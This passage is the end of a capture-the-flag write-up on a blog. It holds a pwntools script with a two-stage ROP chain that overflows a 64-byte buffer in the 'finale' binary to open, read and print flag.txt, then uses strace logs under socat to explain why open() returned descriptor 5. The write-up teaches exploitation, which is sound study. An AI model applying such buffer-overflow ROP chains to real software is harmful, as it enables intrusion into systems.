</span></span><span style="display:flex;"><span>open_plt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4010e0</span>
</span></span><span style="display:flex;"><span>read_plt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401090</span>
</span></span><span style="display:flex;"><span>write_plt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401050</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#ae81ff">64</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>   <span style="color:#75715e"># buffer size + RBP size</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ropchain_stage1 <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>flat({
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span>: [
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;flag.txt</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> (padding <span style="color:#f92672">-</span> len(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;flag.txt</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>)),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(pop_rdi),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(buffer_address),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(pop_rsi),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0</span>),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(open_plt),      <span style="color:#75715e"># open(&#34;flag.txt&#34;, O_RDONLY), file descriptor returned for &#34;flag.txt&#34; 5 (found from troubleshooting)</span>
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;finale&#34;</span>])
</span></span><span style="display:flex;"><span>    ]
</span></span><span style="display:flex;"><span>})  <span style="color:#75715e"># call to open() sets RDX to 0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;exploit&#34;</span>, <span style="color:#e6db74">&#34;wb+&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;s34s0nf1n4l3b00</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(ropchain_stage1)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>sendline(ropchain_stage1)
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>readrepeat(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ropchain_stage2 <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>flat({
</span></span><span style="display:flex;"><span>    padding: [
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(pop_rdi),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">5</span>),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(pop_rsi),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(buffer_address),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(read_plt),      <span style="color:#75715e"># read(5, buffer, 84), rdx was set to 84 already and we lacked any gadget to modify it</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(pop_rdi),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">1</span>),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(pop_rsi),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(buffer_address),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(write_plt),     <span style="color:#75715e"># write(stdout, buffer, 84)</span>
</span></span><span style="display:flex;"><span>    ]
</span></span><span style="display:flex;"><span>})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>sendline(ropchain_stage2)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;That&#39;s a nice wish! Let the Spooktober Spirit be with you!</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>pwn<span style="color:#f92672">.</span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;FLAG: </span><span style="color:#e6db74">{</span>proc<span style="color:#f92672">.</span>readline()<span style="color:#f92672">.</span>decode()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span></code></pre></div><h3 id="digging-deeper">Digging deeper</h3>
<blockquote>
<p>Why did <strong>open()</strong> return <code>5</code>?</p>
</blockquote>
<p>Upon reading through strace logs, I found that socat registered <strong>3</strong>, <strong>4</strong> for socketpair (<em>socketpair are 2 file descriptors used for inter-process communication, they are bi-directional in nature. Usually before forking a process creates a pair and then parent and child use one fd from the pair for read/write while close the other</em>), while <strong>5</strong> was used for socket connection, and the newly created conenction was assigned <strong>6</strong>.</p>
<pre tabindex="0"><code>socketpair(AF_UNIX, SOCK_DGRAM, 0, [3, 4]) = 0
...
socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 5
bind(5, {sa_family=AF_INET, sin_port=htons(9001), sin_addr=inet_addr(&#34;0.0.0.0&#34;)}, 16) = 0
getsockname(5, {sa_family=AF_INET, sin_port=htons(9001), sin_addr=inet_addr(&#34;0.0.0.0&#34;)}, [16]) = 0
listen(5, 5) 
...
accept(5, {sa_family=AF_INET, sin_port=htons(42340), sin_addr=inet_addr(&#34;172.17.0.1&#34;)}, [16]) = 6
</code></pre><p>Once I run my exploit, 2 new processes are created PID <code>9</code>, <code>10</code></p>
<p><strong>PID 9</strong> closed the socket connection and was out of the picture.</p>
<pre tabindex="0"><code>[pid     9] close(6)                    = 0
</code></pre><p>Meanwhile, <strong>PID 10</strong> (returned by the original <strong>clone()</strong> call), closed <strong>3</strong>, <strong>4</strong> and re-registered the socketpair. It further registered a new socket pair <strong>5</strong>, <strong>7</strong> after closing the socket <strong>5</strong>. But this one kept fd <strong>6</strong> pointing to current connection. Next, it **clone()**s again to create <strong>PID 11</strong>. Finally it closes <strong>7</strong>, thus it would be using <strong>5</strong> for communication</p>
<pre tabindex="0"><code>clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f06e36fda10) = 10

[pid    10] close(4 &lt;unfinished ...&gt;
[pid    10] &lt;... close resumed&gt;)        = 0
[pid    10] close(3)                    = 0
[pid    10] socketpair(AF_UNIX, SOCK_DGRAM, 0, [3, 4]) = 0
...
[pid    10] close(5)                    = 0
[pid    10] socketpair(AF_UNIX, SOCK_STREAM, 0, [5, 7]) = 0
...
[pid    10] clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLDstrace: Process 11 attached
 &lt;unfinished ...&gt;
...
[pid    10] close(7)
</code></pre><p>And finally, <strong>PID 11</strong> closed <strong>3</strong>, <strong>4</strong>, <strong>5</strong> (socketpairs created by <strong>PID 10</strong>). Re-creates two socketpairs 3-4. Duplicated <strong>7</strong> as stdin and stdout and closed <strong>7</strong>. Finally <strong>PID 11</strong> loads <strong>finale</strong> binary into memory.</p>
<pre tabindex="0"><code>[pid    11] close(4 &lt;unfinished ...&gt;
[pid    11] &lt;... close resumed&gt;)        = 0
[pid    11] close(3 &lt;unfinished ...&gt;
[pid    11] &lt;... close resumed&gt;)        = 0
...
[pid    11] socketpair(AF_UNIX, SOCK_DGRAM, 0 &lt;unfinished ...&gt;
[pid    11] &lt;... socketpair resumed&gt;, [3, 4]) = 0
...
[pid    11] close(5 &lt;unfinished ...&gt;
[pid    11] &lt;... close resumed&gt;)        = 0
...
[pid    11] dup2(7, 0 &lt;unfinished ...&gt;
[pid    11] &lt;... dup2 resumed&gt;)         = 0
[pid    11] dup2(7, 1 &lt;unfinished ...&gt;
[pid    11] &lt;... dup2 resumed&gt;)         = 1
[pid    11] close(7)                    = 0
[pid    11] execve(&#34;./challengeBinary&#34;, [&#34;./challengeBinary&#34;], 0x5603cdb74e40 /* 12 vars */ &lt;unfinished ...&gt;
</code></pre><p>When <strong>finale</strong> was loaded, it had following file descriptors</p>
<ul>
<li>0 - pointing to socketpair to communicate with <strong>PID 10</strong></li>
<li>1 - pointing to socketpair to communicate with <strong>PID 10</strong></li>
<li>2 - stderr</li>
<li>3 - pointing to socketpair it (<strong>PID 11</strong>) created</li>
<li>4 - pointing to socketpair it (<strong>PID 11</strong>) created</li>
<li>5 - FREE</li>
</ul>
<p>Thus, 5 was allocated to all subsequent **open()**s</p>
</div>
</article>

    <hr />
    <p class="articleTagsContainer">
        <span> </span>
        <strong>Tags:</strong>
        
            <a
                
                href="/tags/ctf/">#ctf</a>
        
            <a
                
                href="/tags/linux/">#linux</a>
        
            <a
                
                href="/tags/pwn/">#pwn</a>
        
            <a
                
                href="/tags/writeup/">#writeup</a>
        
    </p>






                    </main><footer>
    <hr />

<p><small>
        2025 &copy; Just adhere to <a href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a>
    </small></p>
    <p><small>
        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
    </small></p>
</footer>
</div>
            </div>
        </div>


</body>
</html>
